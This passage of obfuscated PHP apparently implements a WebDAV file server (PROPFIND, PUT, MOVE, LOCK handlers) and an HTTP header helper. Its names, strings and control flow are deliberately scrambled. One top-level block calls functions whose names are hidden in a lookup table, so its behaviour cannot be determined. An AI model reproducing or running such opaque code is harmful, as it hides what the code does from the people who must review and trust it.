$Aªƒ‹ã½æé[1800]; $b®•¨¿»ùš .= $Aªƒ‹ã½æé[1801]; } else { $C‚¨œ‹Â¬“ = $AÓ†Ş¸š [$Aªƒ‹ã½æé[170]] ? $AÓ†Ş¸š [$Aªƒ‹ã½æé[170]] : get_path_ext($AÓ†Ş¸š [$Aªƒ‹ã½æé[38]]); $b’ºÈ»§ó = get_file_mime($C‚¨œ‹Â¬“); $b®•¨¿»ùš = $Aªƒ‹ã½æé[1802]; $b®•¨¿»ùš .= "\x3c\104\72\x67\145\164\143\x6f\x6e\x74\145\x6e\164\164\x79\160\145\x3e{$b’ºÈ»§ó}\x3c\x2f\x44\72\147\145\x74\x63\157\156\x74\x65\x6e\164\x74\x79\160\x65\76"; } return "\xa\x9\11\74\x44\72\162\145\163\x70\x6f\x6e\x73\x65\76\12\11\11\11\74\x44\x3a\150\x72\x65\146\76{$eª©ì¯é·§[$Aªƒ‹ã½æé[1797]]}\74\x2f\104\72\150\x72\x65\x66\x3e\12\11\x9\x9\74\x44\72\x70\162\x6f\x70\x73\x74\x61\164\76\xa\x9\11\11\11\74\104\72\160\x72\157\x70\76\xa\x9\x9\x9\11\x9\x3c\x44\72\x67\145\x74\x6c\x61\x73\x74\155\157\x64\151\x66\x69\x65\x64\x3e{$eª©ì¯é·§[$Aªƒ‹ã½æé[117]]}\74\x2f\104\72\147\145\164\154\141\x73\x74\155\x6f\144\151\146\x69\145\x64\x3e\12\11\11\11\x9\11\74\x44\x3a\x63\162\x65\x61\164\x69\x6f\x6e\144\x61\x74\x65\76{$eª©ì¯é·§[$Aªƒ‹ã½æé[197]]}\x3c\57\x44\x3a\143\x72\145\x61\x74\x69\157\x6e\x64\x61\164\145\76\12\x9\x9\11\x9\x9\74\x44\x3a\x67\145\164\143\x6f\156\164\145\x6e\164\x6c\x65\156\147\164\x68\x3e{$eª©ì¯é·§[$Aªƒ‹ã½æé[87]]}\74\57\x44\72\147\x65\164\143\157\x6e\x74\145\x6e\164\x6c\x65\156\147\164\x68\x3e\xa\x9\x9\x9\x9\x9{$b®•¨¿»ùš}\12\x9\11\11\x9\74\57\104\72\160\x72\x6f\160\76\12\11\x9\x9\11\x3c\104\72\163\x74\x61\x74\x75\163\x3e\110\124\x54\x50\57\x31\56\x31\40\x32\60\60\40\x4f\113\74\57\104\72\x73\164\141\164\x75\x73\76\12\x9\11\11\74\57\x44\72\160\x72\157\160\x73\x74\141\164\x3e\12\x9\x9\74\x2f\104\x3a\x72\145\x73\x70\x6f\x6e\x73\x65\x3e"; } public function pathListMerge($Dø•ìº¤¡„) { goto eìøÕÍµ¸Ä; DØ¿Ç¥¤½: $Eé•Ì¤ˆİê = array(); foreach ($Dø•ìº¤¡„ as $E’«‡¿Ç³ => $B“÷¾Äá“â) { if (!in_array($E’«‡¿Ç³, $E‚Õ‘É©ÍŸ) || !is_array($B“÷¾Äá“â)) { continue; } $Eé•Ì¤ˆİê = array_merge($Eé•Ì¤ˆİê, $B“÷¾Äá“â); } foreach ($Eé•Ì¤ˆİê as &$AÀñöñİİÂ) { $AÀñöñİİÂ[$BÌáŒ¶Œìº[38]] = str_replace($BÌáŒ¶Œìº[18], $BÌáŒ¶Œìº[1396], $AÀñöñİİÂ[$BÌáŒ¶Œìº[38]]); } goto D¡ò®¶×°; eìøÕÍµ¸Ä: $BÌáŒ¶Œìº =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$Dø•ìº¤¡„) { return $Dø•ìº¤¡„; } $E‚Õ‘É©ÍŸ = array($BÌáŒ¶Œìº[83], $BÌáŒ¶Œìº[84], $BÌáŒ¶Œìº[1803]); goto DØ¿Ç¥¤½; D¡ò®¶×°: unset($AÀñöñİİÂ); return $Eé•Ì¤ˆİê; goto D¯Á•Èœç; D¯Á•Èœç: } public function httpPROPFIND() { goto FÒŸ™«È¥Ø; cÊÚÖÜÀ©°: $ağ£ÅÑ¡Ô¨ = $EµáØåÒÍ¥[$E®ãÍñÂº÷[1804]]; if (!is_array($E°ô“ƒ˜ä¯) || $ağ£ÅÑ¡Ô¨[$E®ãÍñÂº÷[1805]] === !1) { return array($E®ãÍñÂº÷[1806] => 404, $E®ãÍñÂº÷[1807] => $E®ãÍñÂº÷[1808]); } $d‡ô´ÒØÆ = $ağ£ÅÑ¡Ô¨[$E®ãÍñÂº÷[39]] == $E®ãÍñÂº÷[177] || HttpHeader::get($E®ãÍñÂº÷[1783]) == $E®ãÍñÂº÷[479]; goto D±â¹àÖ›; CäÕÒĞ‰: return array($E®ãÍñÂº÷[1806] => 207, $E®ãÍñÂº÷[1807] => "\x3c\104\x3a\x6d\x75\x6c\164\151\x73\164\141\x74\165\163\40\170\155\154\156\163\72\x44\x3d\x22\104\x41\x56\72\x22\76\xa{$b·œÓÔ•Ù}\xa\x3c\x2f\x44\x3a\155\165\154\x74\151\x73\x74\141\164\165\x73\x3e"); goto AëÏ·¬‡¸ ; D±â¹àÖ›: if ($d‡ô´ÒØÆ) { $E°ô“ƒ˜ä¯ = array($ağ£ÅÑ¡Ô¨); } else { $ağ£ÅÑ¡Ô¨[$E®ãÍñÂº÷[38]] = $E®ãÍñÂº÷[43]; $E°ô“ƒ˜ä¯ = array_merge(array($ağ£ÅÑ¡Ô¨), $E°ô“ƒ˜ä¯); } $b·œÓÔ•Ù = $E®ãÍñÂº÷[43]; foreach ($E°ô“ƒ˜ä¯ as $FğëÔ´˜é²) { $b·œÓÔ•Ù .= $this->parseItemXml($FğëÔ´˜é², $d‡ô´ÒØÆ); } goto CäÕÒĞ‰; FÒŸ™«È¥Ø: $E®ãÍñÂº÷ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EµáØåÒÍ¥ = $this->pathList($this->path); $E°ô“ƒ˜ä¯ = $this->pathListMerge($EµáØåÒÍ¥); goto cÊÚÖÜÀ©°; AëÏ·¬‡¸ : } public function httpHEAD() { $f–Î…ƒìÏ¶ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dÒºˆš‚ = $this->pathInfo($this->path); if (!$dÒºˆš‚ || $dÒºˆš‚[$f–Î…ƒìÏ¶[39]] == $f–Î…ƒìÏ¶[86]) { return array($f–Î…ƒìÏ¶[1039] => 200, $f–Î…ƒìÏ¶[1214] => array($f–Î…ƒìÏ¶[1809])); } return array($f–Î…ƒìÏ¶[1039] => 200, $f–Î…ƒìÏ¶[1214] => array($f–Î…ƒìÏ¶[1810], $f–Î…ƒìÏ¶[146], $f–Î…ƒìÏ¶[1811] . $dÒºˆš‚[$f–Î…ƒìÏ¶[87]], $f–Î…ƒìÏ¶[1812] . get_file_mime($dÒºˆš‚[$f–Î…ƒìÏ¶[170]]), $f–Î…ƒìÏ¶[142] . gmdate($f–Î…ƒìÏ¶[1798], $dÒºˆš‚[$f–Î…ƒìÏ¶[1261]]) . $f–Î…ƒìÏ¶[1813], $f–Î…ƒìÏ¶[1814])); } public function httpOPTIONS() { $E™«áøŠØê =& $_SERVER[çŞáÓæÚô‚Ô‡]; return array($E™«áøŠØê[1039] => 200, $E™«áøŠØê[1214] => array($E™«áøŠØê[1815], $E™«áøŠØê[1816], $E™«áøŠØê[1817], $E™«áøŠØê[1270])); } public function httpPROPPATCH() { $c÷‚ë”½¿Ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eôœ‰Âê‰ = $c÷‚ë”½¿Ò[1818] . $_SERVER[$c÷‚ë”½¿Ò[1394]] . $c÷‚ë”½¿Ò[1819]; return array($c÷‚ë”½¿Ò[1806] => 207, $c÷‚ë”½¿Ò[1807] => "\74\104\x3a\155\165\154\x74\x69\163\x74\x61\164\x75\x73\x20\170\155\x6c\156\x73\72\x44\75\42\x44\x41\126\x3a\x22\x3e\12{$Eôœ‰Âê‰}\xa\74\57\104\72\155\x75\x6c\164\151\x73\164\141\164\165\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $AáÆ´Æ”½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $dŞôí·¯¦ = $this->uploadFile(); if ($dŞôí·¯¦) { $dÉØî‘ğ› = 204; } else { $dŞôí·¯¦ = $AáÆ´Æ”½[43]; $dÉØî‘ğ› = 201; } $A±é‚ß˜‰ = $this->pathPut($this->path, $dŞôí·¯¦); if ($A±é‚ß˜‰ == !1) { $dÉØî‘ğ› = 404; } return array($AáÆ´Æ”½[1806] => $dÉØî‘ğ›); } private function uploadFile() { goto EÛĞ­¯Øëœ; EÛĞ­¯Øëœ: $B’Ü´”Ë´ =& $_SERVER[çŞáÓæÚô‚Ô‡]; @mk_dir(TEMP_FILES); $BŠé»‘Ñ‡ = TEMP_FILES . $B’Ü´”Ë´[1820] . rand_string(32); goto EÉÖ‚É¹Ç; EÉÖ‚É¹Ç: $e»Óï¯¹Ï = @fopen($BŠé»‘Ñ‡, $B’Ü´”Ë´[1528]); $cæğ†£Œ¤ˆ = @fopen($B’Ü´”Ë´[1821], $B’Ü´”Ë´[1527]); if (!$cæğ†£Œ¤ˆ || !$e»Óï¯¹Ï) { @unlink($BŠé»‘Ñ‡); return !1; } goto C¼´‰ö®ö; DùË¹‚ãÂ: if (@filesize($BŠé»‘Ñ‡) > 0) { return $BŠé»‘Ñ‡; } @unlink($BŠé»‘Ñ‡); return !1; goto B–Šñ‹¡ˆ½; C¼´‰ö®ö: while (!feof($cæğ†£Œ¤ˆ)) { fwrite($e»Óï¯¹Ï, fread($cæğ†£Œ¤ˆ, 1024 * 200)); } fclose($cæğ†£Œ¤ˆ); fclose($e»Óï¯¹Ï); goto DùË¹‚ãÂ; B–Šñ‹¡ˆ½: } public function httpMKCOL() { $eÔ¸‹±¡Í„ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($this->pathExists($this->path)) { return array($eÔ¸‹±¡Í„[1039] => 409); } $cİ†Ÿ¡“ˆ¾ = $this->pathMkdir($this->path); return array($eÔ¸‹±¡Í„[1039] => $cİ†Ÿ¡“ˆ¾ ? 201 : 403); } public function httpMOVE() { $fù¹ª­‚õÊ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $B†Ø£×Ûô‹ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$fù¹ª­‚õÊ[1822]])) { $eÔå½Üİàá[$fù¹ª­‚õÊ[1823]] = $_SERVER[$fù¹ª­‚õÊ[1822]] == $fù¹ª­‚õÊ[1824]; } $eª²×ó‰ˆ§ = $this->pathMove($this->path, $B†Ø£×Ûô‹); return array($fù¹ª­‚õÊ[1039] => $eª²×ó‰ˆ§ ? 201 : 404); } public function httpCOPY() { $eÛ…‡ö”©Ï = $this->parsePath($this->pathGet(!0)); $eŒ‰Ìß…¹÷ = $this->pathCopy($this->path, $eÛ…‡ö”©Ï); return array($_SERVER[çŞáÓæÚô‚Ô‡][1039] => $eŒ‰Ìß…¹÷ ? 201 : 404); } public function httpDELETE() { $fŠ§°¦¬¤œ = $this->pathRemove($this->path); return array($_SERVER[çŞáÓæÚô‚Ô‡][1039] => $fŠ§°¦¬¤œ ? 200 : 503); } public function httpLOCK() { $f½”ËÊÍ½É =& $_SERVER[çŞáÓæÚô‚Ô‡]; $e¤çî‘Ïç– = md5($this->path); $DÇÍáØŞ¦ò = $f½”ËÊÍ½É[1825] . $this->xmlGet($f½”ËÊÍ½É[1826]) . $f½”ËÊÍ½É[1827] . $e¤çî‘Ïç– . $f½”ËÊÍ½É[1828]; return array($f½”ËÊÍ½É[1039] => 200, $f½”ËÊÍ½É[1214] => array($f½”ËÊÍ½É[1829] . $e¤çî‘Ïç–, $f½”ËÊÍ½É[1830]), $f½”ËÊÍ½É[1831] => $DÇÍáØŞ¦ò); } public function httpUNLOCK() { return array($_SERVER[çŞáÓæÚô‚Ô‡][1039] => 204); } public function xmlGet($cßÔ‹ë¨¢) { goto dØîÖ›®ñ‡; dØîÖ›®ñ‡: $D¹¥˜ó•ÉÂ =& $_SERVER[çŞáÓæÚô‚Ô‡]; static $B…òÉ¸Ñ‚ò = false; if (!$B…òÉ¸Ñ‚ò) { $e›»„µ•‹æ = file_get_contents($D¹¥˜ó•ÉÂ[1832]); $B…òÉ¸Ñ‚ò = new DOMDocument(); $B…òÉ¸Ñ‚ò->loadXML($e›»„µ•‹æ); } goto F¾ÕµĞ¾Î; F¾ÕµĞ¾Î: $D÷ó®ÄÓ©Ş = explode($D¹¥˜ó•ÉÂ[18], $cßÔ‹ë¨¢); $B¤™ˆª„Ü“ = array_shift($D÷ó®ÄÓ©Ş); $Fæ«‹šË’« = $B…òÉ¸Ñ‚ò->getElementsByTagNameNS($D¹¥˜ó•ÉÂ[1833], $B¤™ˆª„Ü“); goto b³•”çùŒ©; b³•”çùŒ©: if ($Fæ«‹šË’«) { return $Fæ«‹šË’«[0]->nodeValue; } return $D¹¥˜ó•ÉÂ[43]; goto fÄ»´ÑÕŠï; fÄ»´ÑÕŠï: } public static function response($E·Ë±‘»î¶) { goto E¿ßÚ´§ß“; E¿ßÚ´§ß“: $b°º²½²áî =& $_SERVER[çŞáÓæÚô‚Ô‡]; $E¦¦Ğóœ–¦ = is_array($E·Ë±‘»î¶[$b°º²½²áî[1214]]) ? $E·Ë±‘»î¶[$b°º²½²áî[1214]] : array(); $E¦¦Ğóœ–¦[] = HttpHeader::code($E·Ë±‘»î¶[$b°º²½²áî[1039]]); goto E†™ÇÎ­ƒ; EÌ·ÅŠäø: if (is_string($E·Ë±‘»î¶[$b°º²½²áî[1831]])) { header($b°º²½²áî[1834]); $f›¡å›ùÂ¡ = $b°º²½²áî[1835] . $b°º²½²áî[11] . $E·Ë±‘»î¶[$b°º²½²áî[1831]]; echo $f›¡å›ùÂ¡; } goto D¥”£ÃÓêğ; E†™ÇÎ­ƒ: $E¦¦Ğóœ–¦[] = $b°º²½²áî[1773]; $E¦¦Ğóœ–¦[] = $b°º²½²áî[1774]; foreach ($E¦¦Ğóœ–¦ as $BÆåŸÙµ¥£) { header($BÆåŸÙµ¥£); } goto EÌ·ÅŠäø; D¥”£ÃÓêğ: } } if ($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][6]] != $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][7]]) { goto bÕŒÃ¼İËÂ; D©Ş­õ…Ş: $b¶’†Åˆöò = explode($_SERVER[çŞáÓæÚô‚Ô‡][11], $dˆ©ÚÊÒ¦î); if (count($b¶’†Åˆöò) < $_SERVER[çŞáÓæÚô‚Ô‡][12]) { $BÏ¹‹‘áßª = $_SERVER[çŞáÓæÚô‚Ô‡][13]; $BÏ¹‹‘áßª(); } $a…Å³”øˆ§ = $_SERVER[çŞáÓæÚô‚Ô‡][14]; goto Aæå˜—¼Ñ›; Aæå˜—¼Ñ›: $a…Å³”øˆ§($_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][15]]); goto e¬ƒÇ‹Ûó; bÕŒÃ¼İËÂ: $F‘†İ”‰Ã = $_SERVER[çŞáÓæÚô‚Ô‡][8]; $bİ¤ø‰ï“ = $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][9]] . $_SERVER[çŞáÓæÚô‚Ô‡][10]; $dˆ©ÚÊÒ¦î = $F‘†İ”‰Ã($bİ¤ø‰ï“); goto D©Ş­õ…Ş; e¬ƒÇ‹Ûó: } class HttpHeader { public static $_headers = array("\110\x6f\x73\x74" => "\110\124\124\x50\x5f\110\117\123\x54", "\125\x73\145\162\55\101\147\x65\x6e\164" => "\110\124\124\120\x5f\x55\x53\105\x52\x5f\101\107\x45\x4e\x54", "\103\157\156\x74\145\x6e\164\55\124\171\x70\x65" => "\x48\124\x54\120\137\x43\117\116\x54\x45\x4e\124\x5f\124\x59\120\x45", "\103\157\156\x74\145\x6e\x74\x2d\114\145\156\147\x74\150" => "\110\124\x54\x50\x5f\x43\117\x4e\124\105\x4e\124\x5f\x4c\x45\116\107\x54\x48", "\104\x65\x70\x74\x68" => "\x48\124\x54\120\137\x44\x45\120\124\110", "\105\170\x70\x65\143\164" => "\x48\x54\124\x50\x5f\105\x58\x50\x45\103\124", "\111\146\55\116\157\156\x65\55\115\141\x74\143\150" => "\110\124\x54\x50\137\111\106\x5f\x4e\x4f\116\x45\137\x4d\x41\124\x43\x48", "\x49\x66\x2d\x4d\141\x74\143\x68" => "\x48\124\x54\x50\137\111\x46\x5f\115\x41\x54\x43\x48", "\x49\146\55\122\141\x6e\147\145" => "\x48\124\124\x50\x5f\x49\106\x5f\x52\x41\x4e\107\105", "\x4c\x61\163\164\55\x4d\x6f\144\151\146\151\145\144" => "\x48\x54\x54\120\137\x4c\101\123\124\137\x4d\117\x44\111\x46\111\x45\x44", "\x49\x66\55\115\x6f\x64\x69\146\x69\x65\x64\x2d\x53\x69\x6e\143\145" => "\x48\x54\124\x50\137\x49\x46\x5f\115\117\x44\111\x46\x49\x45\104\137\123\x49\116\x43\105", "\111\x66\55\x55\x6e\x6d\157\144\151\x66\151\145\144\55\123\151\x6e\143\145" => "\110\124\x54\x50\x5f\111\106\137\125\116\x4d\117\x44\x49\106\x49\x45\104\x5f\x53\x49\116\x43\x45", "\x52\x61\156\x67\145" => "\110\x54\x54\x50\137\x52\x41\x4e\x47\105", "\x54\151\155\x65\157\165\164" => "\110\x54\124\120\x5f\124\111\115\x45\117\x55\x54", "\111\x66" => "\x48\x54\x54\120\137\x49\106", "\x4c\157\x63\x6b\x2d\x54\157\x6b\x65\156" => "\x48\x54\124\x50\137\114\x4f\x43\113\137\124\x4f\113\105\x4e", "\x4f\166\145\162\167\162\151\x74\x65" => "\x48\x54\x54\120\x5f\117\126\105\122\x57\x52\x49\124\105", "\104\x65\163\164\x69\x6e\141\164\x69\x6f\156" => "\x48\x54\x54\x50\x5f\104\105\123\124\x49\116\x41\124\111\117\x4e", "\122\x65\x71\x75\x65\163\164\55\x49\x64" => "\122\105\121\x55\105\x53\x54\137\111\x44", "\122\x65\161\165\145\163\164\55\x42\x6f\144\x79\55\106\151\x6c\145" => "\x52\x45\x51\x55\105\x53\124\x5f\102\117\104\131\137\x46\111\114\x45", "\122\x65\x64\x69\x72\x65\x63\x74\55\123\x74\141\164\x75\x73" => "\122\105\104\111\122\x45\103\x54\x5f\x53\x54\101\x54\x55\123"); public static function init() { static $BäïÍˆ“œ = false; if ($BäïÍˆ“œ) { return; } foreach ($_SERVER as $DÀ¬¶Ö¡˜ƒ => $bè´ÈÈ ˆ) { $DÀ¬¶Ö¡˜ƒ = strtoupper($DÀ¬¶Ö¡˜ƒ); if (!array_key_exists($DÀ¬¶Ö¡˜ƒ, $_SERVER)) { continue; } $_SERVER[$DÀ¬¶Ö¡˜ƒ] = $bè´ÈÈ ˆ; } foreach (self::$_headers as $DÀ¬¶Ö¡˜ƒ => $d¸íÅ—´á¹) { if (!array_key_exists($DÀ¬¶Ö¡˜ƒ, $_SERVER)) { continue; } $_SERVER[$DÀ¬¶Ö¡˜ƒ] = $_SERVER[$d¸íÅ—´á¹]; $_SERVER[strtoupper($DÀ¬¶Ö¡˜ƒ)] = $_SERVER[$d¸íÅ—´á¹]; } } public static function get($fÀîÊÆï×) { self::init(); return $_SERVER[$fÀîÊÆï×] ? $_SERVER[$fÀîÊÆï×] : $_SERVER[$_SERVER[çŞáÓæÚô‚Ô‡][1836] . strtoupper($fÀîÊÆï×)]; } public static function method() { return strtoupper(self::get($_SERVER[çŞáÓæÚô‚Ô‡][164])); } public static function length() { $EÍ›‹÷ß‰È =& $_SERVER[çŞáÓæÚô‚Ô‡]; $EÁõ„‚Ç¡ = self::get($EÍ›‹÷ß‰È[1837]); if (!$EÁõ„‚Ç¡) { $EÁõ„‚Ç¡ = self::get($EÍ›‹÷ß‰È[1153]); } return $EÁõ„‚Ç¡; } public static function range() { $bŠÎÛËÙ˜Ş =& $_SERVER[çŞáÓæÚô‚Ô‡]; $c…ôé«™ƒ = self::get($bŠÎÛËÙ˜Ş[208]); if (!$c…ôé«™ƒ) { return !1; } if (!preg_match($bŠÎÛËÙ˜Ş[1838], $c…ôé«™ƒ, $Bé‡ğ†ÅÆ)) { return !1; } if ($Bé‡ğ†ÅÆ[1] === $bŠÎÛËÙ˜Ş[43] && $Bé‡ğ†ÅÆ[2] === $bŠÎÛËÙ˜Ş[43]) { return !1; } return array($Bé‡ğ†ÅÆ[1] !== $bŠÎÛËÙ˜Ş[43] ? $Bé‡ğ†ÅÆ[1] : null, $Bé‡ğ†ÅÆ[2] !== $bŠÎÛËÙ˜Ş[43] ? $Bé‡ğ†ÅÆ[2] : null); } public static $statusCode = array("\x31\x30\x30" => "\103\x6f\156\164\x69\x6e\165\145", "\x31\60\x31" => "\123\167\151\x74\143\x68\x69\156\147\40\120\x72\x6f\164\x6f\143\x6f\x6c", "\61\60\x32" => "\120\162\157\143\145\x73\x73\x69\156\x67", "\61\x30\63" => "\105\x61\x72\x6c\x79\x20\x48\151\156\x74\x73", "\62\60\x30" => "\117\x4b", "\62\60\61" => "\103\x72\x65\x61\164\x65\144", "\62\x30\62" => "\x41\x63\x63\145\160\x74\x65\x64", "\x32\x30\63" => "\x4e\157\x6e\55\101\x75\x74\x68\x6f\x72\151\x74\141\164\x69\166\145\x20\111\x6e\146\157\x72\155\141\164\x69\x6f\156", "\x32\60\x34" => "\x4e\157\40\x43\157\x6e\x74\145\x6e\164", "\x32\x30\65" => "\122\145\163\145\x74\x20\x43\157\156\164\x65\156\x74", "\62\60\x36" => "\x50\x61\x72\164\151\x61\154\40\103\x6f\156\164\x65\x6e\164", "\62\x30\x37" => "\115\x75\154\164\x69\55\x53\164\x61\x74\x75\163", "\x33\60\x30" => "\115\165\x6c\164\x69\160\154\145\40\x43\x68\x6f\151\143\145\x73", "\63\60\x31" => "\115\157\166\x65\x64\x20\x50\145\162\155\141\156\145\156\x74\154\x79", "\63\x30\x32" => "\x46\x6f\x75\x6e\x64", "\x33\60\63" => "\123\x65\x65\x20\117\x74\150\145\x72", "\x33\x30\64" => "\116\x6f\x74\40\115\x6f\144\x69\x66\151\145\144", "\63\60\x35" => "\x55\163\x65\40\120\x72\157\170\x79", "\63\60\x37" => "\124\145\x6d\160\x6f\x72\x61\162\x79\40\x52\145\x64\x69\162\145\x63\x74", "\63\x30\70" => "\120\x65\162\x6d\x61\156\145\156\x74\x20\x52\x65\144\151\162\145\x63\164", "\x34\60\60" => "\102\141\x64\x20\122\145\x71\165\x65\163\164", "\x34\x30\61" => "\125\x6e\141\x75\164\150\157\x72\x69\172\145\144", "\64\x30\x32" => "\120\141\171\155\145\x6e\164\40\122\145\x71\165\x69\x72\x65\x64", "\x34\x30\x33" => "\x46\x6f\x72\x62\151\x64\144\x65\x6e", "\x34\60\x34" => "\116\x6f\164\40\x46\x6f\165\156\144", "\x34\60\65" => "\115\145\x74\150\157\144\x20\x4e\x6f\x74\x20\x41\154\154\157\x77\x65\x64", "\x34\60\66" => "\116\x6f\164\x20\x41\143\143\x65\160\x74\141\142\154\x65", "\x34\x30\67" => "\x50\162\157\170\x79\x20\101\165\164\x68\145\x6e\164\151\143\141\x74\151\x6f\x6e\40\122\145\x71\165\x69\x72\145\x64", "\x34\x30\70" => "\x52\x65\161\165\x65\x73\x74\x20\124\x69\x6d\x65\157\165\164", "\64\x30\71" => "\x43\157\x6e\x66\x6c\x69\x63\x74", "\64\x31\60" => "\107\x6f\x6e\145", "\x34\x31\x31" => "\x4c\145\x6e\147\164\150\40\x52\x65\x71\165\x69\x72\x65\x64", "\64\x31\62" => "\x50\162\x65\143\x6f\x6e\x64\x69\x74\151\157\156\x20\x46\141\151\x6c\x65\144", "\64\61\63" => "\122\145\161\x75\x65\163\164\40\105\156\164\151\164\x79\x20\x54\x6f\x6f\x20\114\141\162\x67\x65", "\64\61\x34" => "\x52\x65\161\165\145\163\164\40\125\122\111\x20\124\157\x6f\40\114\141\162\147\x65", "\64\x31\x35" => "\125\x6e\163\165\x70\x70\157\x72\164\145\144\x20\115\145\144\151\141\x20\x54\x79\160\145", "\64\x31\x36" => "\x52\145\161\165\145\x73\x74\x65\144\x20\x52\141\156\147\145\40\116\x6f\164\x20\123\x61\164\x69\163\146\151\x61\x62\154\145", "\x34\61\67" => "\x45\170\160\x65\x63\x74\141\x74\x69\x6f\156\x20\106\141\151\154\x65\144", "\64\62\62" => "\x55\x6e\160\162\157\x63\145\x73\163\141\142\154\145\40\x45\x6e\x74\x69\164\171", "\x34\62\63" => "\x4c\157\143\153\x65\144", "\x34\62\64" => "\x46\141\x69\x6c\145\144\40\104\145\160\145\x6e\x64\145\x6e\x63\171", "\x34\62\x35" => "\x55\x6e\157\162\144\x65\x72\x65\x64\x20\x43\157\x6c\154\145\x63\164\151\157\x6e", "\64\x32\66" => "\x55\x70\147\162\x61\144\x65\x20\x52\145\x71\165\x69\x72\x65\144", "\64\62\70" => "\x50\x72\x65\x63\x6f\x6e\x64\151\x74\x69\157\156\x20\x52\x65\161\165\151\x72\145\x64", "\x34\62\71" => "\124\x6f\x6f\40\115\x61\x6e\x79\40\122\145\x71\165\145\163\164\x73", "\64\63\61" => "\122\145\x71\x75\x65\x73\x74\40\110\x65\141\144\145\162\40\x46\x69\x65\154\x64\x73\x20\x54\x6f\157\x20\114\x61\162\x67\145", "\x34\64\x34" => "\x4e\x6f\x20\x52\145\x73\160\x6f\156\x73\145", "\64\65\x30" => "\x42\x6c\157\x63\153\x65\144\40\x62\x79\40\x57\151\x6e\x64\157\167\x73\x20\x50\x61\x72\145\x6e\x74\x61\154\x20\103\x6f\x6e\x74\x72\x6f\x6c\x73", "\x34\x35\x31" => "\125\x6e\x61\166\141\151\154\x61\x62\x6c\145\40\106\x6f\x72\x20\114\x65\x67\x61\x6c\x20\x52\145\141\163\x6f\x6e\163", "\x34\71\x34" => "\122\x65\x71\165\x65\x73\164\x20\110\145\141\x64\x65\162\x20\124\157\157\40\114\x61\162\147\145", "\65\x30\x30" => "\111\156\164\145\162\156\141\154\40\123\x65\162\x76\x65\162\x20\105\x72\x72\x6f\162", "\x35\60\x31" => "\116\157\x74\x20\x49\155\x70\154\145\x6d\x65\x6e\x74\145\x64", "\65\x30\x32" => "\102\141\144\x20\x47\x61\164\145\x77\x61\171", "\x35\x30\63" => "\123\x65\x72\166\x69\x63\x65\x20\x55\156\141\x76\141\x69\x6c\141\142\x6c\x65", "\x35\60\x34" => "\x47\141\164\x65\167\141\x79\40\x54\151\155\145\157\x75\x74", "\x35\x30\x35" => "\x48\124\x54\x50\x20\126\x65\x72\163\x69\157\x6e\40\x6e\157\164\40\163\165\160\x70\157\x72\164\145\x64", "\x35\60\x37" => "\111\x6e\163\x75\146\146\x69\x63\151\x65\x6e\164\x20\123\164\157\162\x61\147\145"); public static function code($A ô“©äè) { $EÊ“İÁÀƒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A ô“©äè = $A ô“©äè . $EÊ“İÁÀƒ[43]; $C·Á˜ÕãâÀ = self::$statusCode[$A ô“©äè]; $C·Á˜ÕãâÀ = $C·Á˜ÕãâÀ ? "\x48\124\x54\x50\57\x31\x2e\61\x20{$A ô“©äè}\x20" . $C·Á˜ÕãâÀ : $EÊ“İÁÀƒ[43]; return $C·Á˜ÕãâÀ; } } goto e…Óğœ³Ç†; aË´Š’ º: define($_SERVER[çŞáÓæÚô‚Ô‡][235], 1); define($_SERVER[çŞáÓæÚô‚Ô‡][236], 2); define($_SERVER[çŞáÓæÚô‚Ô‡][237], 3); goto E§ƒÉÚøí; f¸•«ßíö: class TaskFileTransfer extends Task { protected function startAfter() { goto cĞ‡Ú•…Ã; cĞ‡Ú•…Ã: $F‡à«¸—½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÁ«Ş’òîŞ =& $this->task; $this->sourceCopyFolder = !1; goto e˜£š¥™Á‰; Eù×±ëÓ·: $AÁ«Ş’òîŞ[$F‡à«¸—½[985]] = $F‡à«¸—½[43]; $AÁ«Ş’òîŞ[$F‡à«¸—½[1490]] = $F‡à«¸—½[43]; $AÁ«Ş’òîŞ[$F‡à«¸—½[1491]] = 0; goto b„²Í‚Ïİí; b„²Í‚Ïİí: $AÁ«Ş’òîŞ[$F‡à«¸—½[1492]] = 0; $AÁ«Ş’òîŞ[$F‡à«¸—½[1493]] = 0; if (!$AÁ«Ş’òîŞ[$F‡à«¸—½[1349]]) { $AÁ«Ş’òîŞ[$F‡à«¸—½[1349]] = LNG($F‡à«¸—½[1494]); } goto B¨à£ë¢ø; eŠ¸¦¦Ÿƒè: Hook::bind($F‡à«¸—½[554], array($this, $F‡à«¸—½[1475])); Hook::bind($F‡à«¸—½[520], array($this, $F‡à«¸—½[1476])); Hook::bind($F‡à«¸—½[517], array($this, $F‡à«¸—½[1476])); goto C…²´õ­¾; C…²´õ­¾: Hook::bind($F‡à«¸—½[522], array($this, $F‡à«¸—½[1476])); Hook::bind($F‡à«¸—½[524], array($this, $F‡à«¸—½[1476])); Hook::bind($F‡à«¸—½[526], array($this, $F‡à«¸—½[1476])); goto B¦‚°œ«ˆ; a„ğ›¤í›: Hook::bind($F‡à«¸—½[1480], array($this, $F‡à«¸—½[1481])); Hook::bind($F‡à«¸—½[1482], array($this, $F‡à«¸—½[1483])); Hook::bind($F‡à«¸—½[1484], array($this, $F‡à«¸—½[1485])); goto B§æ™øŒòæ; B§æ™øŒòæ: $AÁ«Ş’òîŞ[$F‡à«¸—½[1486]] = LNG($F‡à«¸—½[1487]); $AÁ«Ş’òîŞ[$F‡à«¸—½[1488]] = 0; $AÁ«Ş’òîŞ[$F‡à«¸—½[1489]] = 0; goto Eù×±ëÓ·; e˜£š¥™Á‰: Hook::bind($F‡à«¸—½[1467], array($this, $F‡à«¸—½[1468])); Hook::bind($F‡à«¸—½[1469], array($this, $F‡à«¸—½[1470])); Hook::bind($F‡à«¸—½[1471], array($this, $F‡à«¸—½[1472])); goto CÇ±¼„êï; 